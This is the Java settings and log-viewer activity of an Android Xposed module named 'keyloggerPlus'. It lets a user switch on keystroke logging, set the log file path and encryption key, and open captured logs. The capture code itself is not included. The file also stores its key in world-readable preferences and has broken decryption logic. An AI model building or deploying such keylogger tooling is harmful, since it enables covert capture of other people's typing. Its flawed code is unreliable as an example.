package com.sscsps.keyloggerPlus;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

import de.robv.android.xposed.XposedBridge;


public class MainActivity extends Activity {
	public static final String EXTRA_MESSAGE = "com.sscsps.keyloggerPlus.Data";
	public static final String ENCRYPTED_MESSAGE = "com.sscsps.keyloggerPlus.DataEncrypt";
	static String FileData ;
	static String UserKey;
	final Context context = this;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		final String defaultToast = "Settings saved. Reboot to use new preferences";
		final SharedPreferences sp = getSharedPreferences(Hook.mSharedPrefs,MODE_WORLD_READABLE);


		if(!sp.getBoolean(Hook.mUseDate, false))
			((TextView) findViewById(R.id.pathBox)).setText(sp.getString(Hook.mLogPath, "KeyLogs/logs.txt"));
		else
			((TextView) findViewById(R.id.pathBox)).setText(sp.getString(Hook.mLogPath, "KeyLogs"));
		((CheckBox) findViewById(R.id.activeCheckBox)).setChecked(sp.getBoolean(Hook.mActive, false));
		((CheckBox) findViewById(R.id.dateCheckBox)).setChecked(sp.getBoolean(Hook.mUseDate, false));
		((CheckBox) findViewById(R.id.encryption)).setChecked(sp.getBoolean(Hook.mEncrypt, false));
		((EditText) findViewById(R.id.EncryptionKeyName)).setText(sp.getString(Hook.mEncryptKeyName, ""));


		findViewById(R.id.saveButton).setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View v) {
				sp.edit().putString(Hook.mLogPath, ((EditText) findViewById(R.id.pathBox)).getText().toString()).apply();
				showToast(defaultToast);
			}
		});


		((CheckBox) findViewById(R.id.activeCheckBox)).setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
				sp.edit().putBoolean(Hook.mActive, isChecked).apply();
				showToast(defaultToast);
			}
		});

		((CheckBox) findViewById(R.id.dateCheckBox)).setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
				sp.edit().putBoolean(Hook.mUseDate, isChecked).apply();
				if(isChecked)
					showToast("Put a folder's path in the \"TextBox\" above.");
				else
					showToast("Put a file's path in the \"TextBox\" above.");
				showToast(defaultToast);
			}
		});

		((CheckBox) findViewById(R.id.encryption)).setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
				if(((EditText) findViewById(R.id.EncryptionKey)).getText().toString().length()!=16 && isChecked){
					Toast.makeText(MainActivity.this, "Enter a 16 Digit Key, the key you entered is not 16 digit.",Toast.LENGTH_SHORT).show();
					return;
				}
			}
		});

		findViewById(R.id.keySaveButton).setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View v) {
				if(((EditText) findViewById(R.id.EncryptionKey)).getText().toString().length()!=16){
					showToast("Enter a 16 Digit Key, the key you entered is not 16 digit.");
					return;
				}
				if(!((CheckBox)findViewById(R.id.encryption)).isChecked()){
                    showToast("Enable the encryption checkbox first and then Save.");
                    return;
                }
                if(((EditText) findViewById(R.id.EncryptionKey)).getText().toString() == ""){
					showToast("Enter a name for the key");
					return;
				}
				sp.edit().putString(Hook.mEncryptKey, ((EditText) findViewById(R.id.EncryptionKey)).getText().toString()).apply();
				sp.edit().putString(Hook.mEncryptKeyName, ((EditText) findViewById(R.id.EncryptionKeyName)).getText().toString()).apply();
				sp.edit().putBoolean(Hook.mEncrypt, ((CheckBox) findViewById(R.id.encryption)).isChecked()).apply();
				showToast("Key saved and encryption is now turned ON");
				showToast(defaultToast);
			}
		});

		findViewById(R.id.LogViewerButton).setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View v) {
				//open the log selector and open it with the log viewer activity.
				showToast("Please select a log file");
				performFileSearch();
			}
		});

	}
	private String GetKey() {
		final EditText[] result = {new EditText(this)};
		result[0] = new EditText(this);
		LayoutInflater li = LayoutInflater.from(context);
		View promptsView = li.inflate(R.layout.custom, null);

		AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(
				context);

		// set prompts.xml to alertdialog builder
		alertDialogBuilder.setView(promptsView);

		final EditText userInput = (EditText) promptsView
				.findViewById(R.id.editTextDialogUserInput);

		// set dialog message
		alertDialogBuilder
				.setCancelable(false)
				.setPositiveButton("OK",
						new DialogInterface.OnClickListener() {
							public void onClick(DialogInterface dialog,int id) {
								// get user input and set it to result
								// edit text
								result[0].setText(userInput.getText());
								UserKey = result[0].getText().toString();
								showToast("Key Entered is: " + result[0].getText().toString());
								if(UserKey.length()!=16){
									showToast("Key is invalid, please try again by selecting the file again.");
									result[0] = null;
								}else{
									OpenLogViewer(FileData, UserKey);
									showToast("This decryption might be wrong as it is tried to decrypt with the key you provided.");
									showToast("if this is not the logs you wanted, you had either selected wrong file or entered Wrong Key.");
									result[0] = null;
								}
							}
						})
				.setNegativeButton("Cancel",
						new DialogInterface.OnClickListener() {
							public void onClick(DialogInterface dialog, int id) {
								result[0] = null;
								dialog.cancel();
							}
						});

		// create alert dialog
		AlertDialog alertDialog = alertDialogBuilder.create();

		// show it
		alertDialog.show();

		return result[0].getText().toString();
	}

	private void showToast(String text){
		Toast.makeText(MainActivity.this, text, Toast.LENGTH_SHORT).show();
	}
	boolean a = false;
	private void OpenLogViewer(String fileData, String userKey) {
		//decrypt the data with the key and then call the OpenLogViewer(fileData) on the decrypted data;

		a=true;
		OpenLogViewer(userKey+fileData);
	}
	private void OpenLogViewer(String fileData) {
		//this function calls the log viewer activity.
		FileData = fileData;
		Intent intent = new Intent(this, logViewerActivity.class);
		intent.putExtra(ENCRYPTED_MESSAGE, a);
		intent.putExtra(EXTRA_MESSAGE, fileData);
		startActivity(intent);
	}

	private static final int READ_REQUEST_CODE = 42;
	/**
	 * Fires an intent to spin up the "file chooser" UI and select an image.
	 */
	public void performFileSearch() {
		Intent intent = new Intent(Intent.ACTION_OPEN_DOCUMENT);
		intent.addCategory(Intent.CATEGORY_OPENABLE);
		intent.setType("*/*");
		startActivityForResult(intent, READ_REQUEST_CODE);
	}
	public void onActivityResult(int requestCode, int resultCode,
								  Intent resultData) {

		// The ACTION_OPEN_DOCUMENT intent was sent with the request code
		// READ_REQUEST_CODE. If the request code seen here doesn't match, it's the
		// response to some other intent, and the code below shouldn't run at all.

		if (requestCode == READ_REQUEST_CODE && resultCode == Activity.RESULT_OK) {
			// The document selected by the user won't be returned in the intent.
			// Instead, a URI to that document will be contained in the return intent
			// provided to this method as a parameter.
			// Pull that URI using resultData.getData().
			Uri uri = null;
			if (resultData != null) {
				uri = resultData.getData();
				try{FileData = readTextFromUri(uri);}
				catch (Exception e){
					XposedBridge.log(e.toString());
				}
			}
		}

		if(FileData.charAt(0)=='x'){
			//file is encrypted
			showToast("File Encrypted");
			UserKey = GetKey();
		}
		else{
			showToast("file not encrypted");//the file is not encrypted;
			OpenLogViewer(FileData);
		}
	}

	private String readTextFromUri(Uri uri) throws IOException {
		InputStream inputStream = getContentResolver().openInputStream(uri);
		BufferedReader reader = new BufferedReader(new InputStreamReader(
				inputStream));
		StringBuilder stringBuilder = new StringBuilder();
		String line;
		while ((line = reader.readLine()) != null) {
			stringBuilder.append(line);
		}
		return stringBuilder.toString();
	}
}
